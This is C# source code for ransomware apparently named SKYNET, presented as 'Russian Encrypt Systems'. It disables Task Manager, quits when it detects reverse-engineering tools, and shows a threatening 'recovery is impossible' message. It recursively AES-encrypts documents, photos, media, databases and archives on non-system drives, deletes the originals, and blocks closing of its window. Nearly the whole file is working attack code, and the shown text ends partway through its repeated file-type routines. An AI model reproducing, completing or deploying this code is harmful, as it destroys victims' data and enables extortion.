/*          
 *                                              //////      ||   //      \\      //      ||\\      ||      ////////      //////////                    
 *                                              //          ||  //        \\    //       || \\     ||      //                ||                        
 *                                              //          || //          \\  //        ||  \\    ||      //                ||                     RUSSIAN
 *                                              //////      ||              \\//         ||   \\   ||      ////              ||                     ENCRYPT
 *                                                  //      || \\            ||          ||    \\  ||      //                ||                     SYSTEMS
 *                                                  //      ||  \\           ||          ||     \\ ||      //                ||
 *                                              //////      ||   \\          ||          ||      \\||      ////////          ||
 *
 */
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.Runtime.InteropServices;
using SKYNET.Properties;
using System.IO;
using System.Security;
using System.Security.Cryptography;

namespace SKYNET
{
    public partial class Form1 : Form
    {
        System.Media.SoundPlayer Start = new System.Media.SoundPlayer(Properties.Resources.Start);     // Interaction sound
        System.Media.SoundPlayer Error = new System.Media.SoundPlayer(Properties.Resources.Error);
        System.Media.SoundPlayer Accept = new System.Media.SoundPlayer(Properties.Resources.Accept);
        int CHECK_KEY = 3;
        static string password = Properties.Resources.EncryptKey;                                   
        byte[] passwordBytes1 = Encoding.UTF8.GetBytes(password);

        public string JPG = "*.jpg";
        public string PNG = "*.png";
        public string JPEG = "*.jpeg";
        public string XLSM = "*.xlsm";
        public string XLSB = "*.xlsb";
        public string XLS = "*.xls";
        public string XLSX = "*.xlsx";
        public string DOCX = "*.docx";
        public string DOCM = "*.docm";
        public string DOC = "*.doc";
        public string PPTX = "*.pptx";
        public string PPT = "*.ppt";
        public string ACCDB = "*.accdb";
        public string MDB = "*.mdb";
        public string MP4 = "*.mp4";
        public string MP3 = "*.mp3";
        public string MKV = "*.mkv";
        public string FLV = "*.flv";
        public string WAV = "*.wav";
        public string MPG = "*.mpg";
        public string PSD = "*.psd";
        public string SQLITE3 = "*.sqlite3";
        public string SQLITEDB = "*.sqlitedb";
        public string SQL = "*.sql";
        public string CPP = "*.cpp";
        public string ASM = "*.asm";
        public string TIFF = "*.tiff";
        public string TIF = "*.tif";
        public string GIF = "*.gif";
        public string PDF = "*.pdf";
        public string CS = "*.cs";
        public string BMP = "*.bmp";
        public string ZIP = "*.zip";
        public string RAR = "*.rar";
        public string S7Z = "*.7z";
        public string GO = "*.go";

        public Form1()
        {
            /*-------------------------------------------------------------PROTECTOR-------------------------------------------------*/

            Microsoft.Win32.RegistryKey regkey;                                                      // OFF TASK MANAGER IN REGISTRY   
            string keyValueInt = "1";
            string subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";

            try
            {
                regkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(subKey);
                regkey.SetValue("DisableTaskMgr", keyValueInt);
                regkey.Close();
            }
            catch { }

            try
            {
                //Autoloader();
            }
            catch(Exception)
            { }

            System.Diagnostics.Process[] processes;                                                   // For Decompiler and Dissasemblies
            processes = System.Diagnostics.Process.GetProcesses();
            int LeightProc = processes.Length;
            string[] Proc = new string[LeightProc];
            for(int vvD=0;vvD<LeightProc;vvD++)
            {
                Proc[vvD] = Convert.ToString(processes[vvD]);
            }
            for (int vvI = 0; vvI < LeightProc; vvI++)
            {
                if (Proc[vvI] == "System.Diagnostics.Process (vb-decompiler-pro)"
                    || Proc[vvI] == "System.Diagnostics.Process (ida pro advanced (32-bit))"
                    || Proc[vvI] == "System.Diagnostics.Process (ida pro advanced (64-bit))"
                    || Proc[vvI] == "System.Diagnostics.Process (ida pro 5.5)"
                    || Proc[vvI] == "System.Diagnostics.Process (dotpeek64)"
                    || Proc[vvI] == "System.Diagnostics.Process (dotpeek32)"
                    || Proc[vvI] == "System.Diagnostics.Process (reflector)"
                    || Proc[vvI] == "System.Diagnostics.Process (ilspy)"
                    || Proc[vvI] == "System.Diagnostics.Process (SND)"
                    || Proc[vvI] == "System.Diagnostics.Process (idaq)"
                    || Proc[vvI] == "System.Diagnostics.Process (w32dsm89)"
                    || Proc[vvI] == "System.Diagnostics.Process (w64dsm89)")
                    // Need write here protect for Visual machines (Guest's process)
                {
                    SHUTDOWN();
                }
            }
            try
            {
                string SystemDrive1 = System.IO.Path.GetPathRoot(WindowsDirectory());                                               // For 'Brute'
                string Systemfolder = SystemDrive1 + "System";
                FileStream Check = new FileStream(Systemfolder + "\\SystemComponentsAutorun.txt", FileMode.Open);
                StreamReader CH = new StreamReader(Check);
                string STRL = CH.ReadLine();
                if(STRL== "You have not chances.")
                {
                    Error.Play();
                    MessageBox.Show("You used a last attempt to recover your files.\nRecovery is impossible.\nGood luck.", "");
                    SHUTDOWN();
                }
                CH.Close();
            }
            catch { }


            /*-----------------------------------------------------------SEARCH AND ENCRYPT------------------------------------------*/

            try
            {
                string SystemDrive = System.IO.Path.GetPathRoot(WindowsDirectory());                   // Get System Directory
                DriveInfo[] allDrives = DriveInfo.GetDrives();                                         // Get All Drives in HDD
                foreach (DriveInfo d in allDrives)                                                     // Scan in founded Drives
                {
                    string DriveType = Convert.ToString(d.DriveType);
                    string Disc = Convert.ToString(d);
                    if (DriveType == "Fixed" && Disc != SystemDrive)                                   // Check Drive (No System, No CD-DVD, No Floppy, No Flash-frive)
                    {
                        DirectoryInfo Drive = new DirectoryInfo(Disc);
                        try
                        {
                            GetFiles_JPG(Drive);
                            GetFiles_PNG(Drive);
                            GetFiles_JPEG(Drive);
                            GetFiles_XLSM(Drive);
                            GetFiles_XLSB(Drive);
                            GetFiles_XLS(Drive);
                            GetFiles_XLSX(Drive);
                            GetFiles_DOCX(Drive);
                            GetFiles_DOCM(Drive);
                            GetFiles_DOC(Drive);
                            GetFiles_PPTX(Drive);
                            GetFiles_PPT(Drive);
                            GetFiles_ACCDB(Drive);
                            GetFiles_MDB(Drive);
                            GetFiles_MP4(Drive);
                            GetFiles_MP3(Drive);
                            GetFiles_MKV(Drive);
                            GetFiles_FLV(Drive);
                            GetFiles_WAV(Drive);
                            GetFiles_MPG(Drive);
                            GetFiles_PSD(Drive);
                            GetFiles_SQLITE3(Drive);
                            GetFiles_SQLITEDB(Drive);
                            GetFiles_SQL(Drive);
                            GetFiles_CPP(Drive);
                            GetFiles_ASM(Drive);
                            GetFiles_TIFF(Drive);
                            GetFiles_TIF(Drive);
                            GetFiles_GIF(Drive);
                            GetFiles_PDF(Drive);
                            GetFiles_CS(Drive);
                            GetFiles_BMP(Drive);
                            GetFiles_ZIP(Drive);
                            GetFiles_RAR(Drive);
                            GetFiles_7Z(Drive);
                            GetFiles_GO(Drive);

                            GetFolders(Drive);
                        }
                        catch (Exception)
                        { }
                    }
                }
            }
        catch {}

        /*-----------------------------------------------------------VISIBLE ENABLED---------------------------------------------*/

        Start.Play();
            InitializeComponent();          
            this.MouseDown += new MouseEventHandler(Form1_MouseDown);
            WindowState = FormWindowState.Normal;
        }


        /*---------------------------------------------------------------OTHER FUNCTIONS FOR WORKED SKYNET--------------------------*/


        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDWININICHANGE = 0x02;


        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern uint GetWindowsDirectory(StringBuilder lpBuffer, uint uSize);


        private static void AES_Encrypt(string inputFile, string outputFile, byte[] passwordBytes)                              // ENCRYPT function
        {
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8};
        string cryptFile = outputFile;
        FileStream fsCrypt = new FileStream(cryptFile, FileMode.Create);

        RijndaelManaged AES = new RijndaelManaged();

        AES.KeySize = 256;
        AES.BlockSize = 128;


        var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
        AES.Key = key.GetBytes(AES.KeySize / 8);
        AES.IV = key.GetBytes(AES.BlockSize / 8);
        AES.Padding = PaddingMode.Zeros;

        AES.Mode = CipherMode.CBC;

        CryptoStream cs = new CryptoStream(fsCrypt,
             AES.CreateEncryptor(),
            CryptoStreamMode.Write);

        FileStream fsIn = new FileStream(inputFile, FileMode.Open);

        int data;
        while ((data = fsIn.ReadByte()) != -1)
            cs.WriteByte((byte)data);


        fsIn.Close();
        cs.Close();
        fsCrypt.Close();
        File.Delete(inputFile);
       }

        private static void AES_Decrypt(string inputFile, string outputFile, byte[] passwordBytes)                              // DECRYPT function
        {
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            FileStream fsCrypt = new FileStream(inputFile, FileMode.Open);

            RijndaelManaged AES = new RijndaelManaged();

            AES.KeySize = 256;
            AES.BlockSize = 128;


            var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
            AES.Key = key.GetBytes(AES.KeySize / 8);
            AES.IV = key.GetBytes(AES.BlockSize / 8);
            AES.Padding = PaddingMode.Zeros;

            AES.Mode = CipherMode.CBC;

            CryptoStream cs = new CryptoStream(fsCrypt,
                AES.CreateDecryptor(),
                CryptoStreamMode.Read);

            FileStream fsOut = new FileStream(outputFile, FileMode.Create);

            int data;
            while ((data = cs.ReadByte()) != -1)
                fsOut.WriteByte((byte)data);

            fsOut.Close();
            cs.Close();
            fsCrypt.Close();
            File.Delete(inputFile);
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)                                                   // OFF ALT+F4
        {
            e.Cancel = true;
            base.OnClosing(e);
        }

        private string WindowsDirectory()                                                                                       // Get system disc
        {
            uint size = 0;
            size = GetWindowsDirectory(null, size);

            StringBuilder sb = new StringBuilder((int)size);
            GetWindowsDirectory(sb, size);

            return sb.ToString();
        }



        void Form1_MouseDown(object sender, MouseEventArgs e)
        {
            base.Capture = false;
            Message m = Message.Create(base.Handle, 0xa1, new IntPtr(2), IntPtr.Zero);
            this.WndProc(ref m);
        }



        void SHUTDOWN()
        {
            Environment.Exit(0);
        }



        void SHUTDOWN2()
        {
            Application.Exit();
        }


        private void button1_MouseEnter(object sender, EventArgs e)                                              
        {
            button1.ForeColor = Color.White;
        }



        private void button1_MouseLeave(object sender, EventArgs e)                                              
        {
            button1.ForeColor = Color.DarkGray;
        }

        private void GetFolders(DirectoryInfo FixedDrive)
        {
            foreach (DirectoryInfo Directory in FixedDrive.GetDirectories())
            {
                try
                {
                    GetFiles_JPG(Directory);
                    GetFiles_PNG(Directory);
                    GetFiles_JPEG(Directory);
                    GetFiles_XLSM(Directory);
                    GetFiles_XLSB(Directory);
                    GetFiles_XLS(Directory);
                    GetFiles_XLSX(Directory);
                    GetFiles_DOCX(Directory);
                    GetFiles_DOCM(Directory);
                    GetFiles_DOC(Directory);
                    GetFiles_PPTX(Directory);
                    GetFiles_PPT(Directory);
                    GetFiles_ACCDB(Directory);
                    GetFiles_MDB(Directory);
                    GetFiles_MP4(Directory);
                    GetFiles_MP3(Directory);
                    GetFiles_MKV(Directory);
                    GetFiles_FLV(Directory);
                    GetFiles_WAV(Directory);
                    GetFiles_MPG(Directory);
                    GetFiles_PSD(Directory);
                    GetFiles_SQLITE3(Directory);
                    GetFiles_SQLITEDB(Directory);
                    GetFiles_SQL(Directory);
                    GetFiles_CPP(Directory);
                    GetFiles_ASM(Directory);
                    GetFiles_TIFF(Directory);
                    GetFiles_TIF(Directory);
                    GetFiles_GIF(Directory);
                    GetFiles_PDF(Directory);
                    GetFiles_CS(Directory);
                    GetFiles_BMP(Directory);
                    GetFiles_ZIP(Directory);
                    GetFiles_RAR(Directory);
                    GetFiles_7Z(Directory);
                    GetFiles_GO(Directory);

                    GetFolders(Directory);
                }
                catch (Exception)
                { }
            }
        }

        private void GetFiles_JPG(DirectoryInfo Folder)                                                 // JPG
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, JPG, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    {}
                }
            }
        }

        private void GetFiles_PNG(DirectoryInfo Folder)                                                 // PNG
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, PNG, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    {}
                }
            }
        }

        private void GetFiles_JPEG(DirectoryInfo Folder)                                                 // JPEG
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, JPEG, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_XLSM(DirectoryInfo Folder)                                                 // XLSM
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, XLSM, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_XLSB(DirectoryInfo Folder)                                                 // XLSB
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, XLSB, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_XLS(DirectoryInfo Folder)                                                 // XLS
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, XLS, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_XLSX(DirectoryInfo Folder)                                                 // XLSX
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, XLSX, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_DOCX(DirectoryInfo Folder)                                                 // DOCX
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, DOCX, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_DOCM(DirectoryInfo Folder)                                                 // DOCM
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, DOCM, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_DOC(DirectoryInfo Folder)                                                 // DOC
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, DOC, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_PPTX(DirectoryInfo Folder)                                                 // PPTX
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, PPTX, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_PPT(DirectoryInfo Folder)                                                 // PPT
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, PPT, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_ACCDB(DirectoryInfo Folder)                                                 // ACCDB
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, ACCDB, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_MDB(DirectoryInfo Folder)                                                 // MDB
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, MDB, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_MP4(DirectoryInfo Folder)                                                 // MP4
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, MP4, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_MP3(DirectoryInfo Folder)                                                 // MP3
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, MP3, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_MKV(DirectoryInfo Folder)                                                 // MKV
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, MKV, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_FLV(DirectoryInfo Folder)                                                 // FLV
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, FLV, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

        private void GetFiles_WAV(DirectoryInfo Folder)                                                 // WAV
        {
            var Files = Directory.EnumerateFiles(Folder.FullName, WAV, SearchOption.TopDirectoryOnly);
            foreach (var File in Files)
            {
                string Founded = File;
                System.IO.FileInfo Size = new System.IO.FileInfo(Founded);
                long TotalSize = Size.Length;
                if (TotalSize < 314572800)
                {
                    try
                    {
                        string CryptF = Founded + ".aes";
                        RegistryKey Way = Registry.CurrentUser.OpenSubKey("Way");
                        if (Way == null)
                        {
                            RegistryKey currentUserKey = Registry.CurrentUser;
                            RegistryKey WayKey = currentUserKey.CreateSubKey("Way");
                            WayKey.Close();
                        }
                        AES_Encrypt(Founded, Founded + ".aes", passwordBytes1);
                        RegistryKey currentUserKey2 = Registry.CurrentUser;
                        RegistryKey Way2 = currentUserKey2.OpenSubKey("Way", true);
                        Way2.SetValue(Founded, CryptF);
                        Way2.Close();
                    }
                    catch (Exception)
                    { }
                }
            }
        }

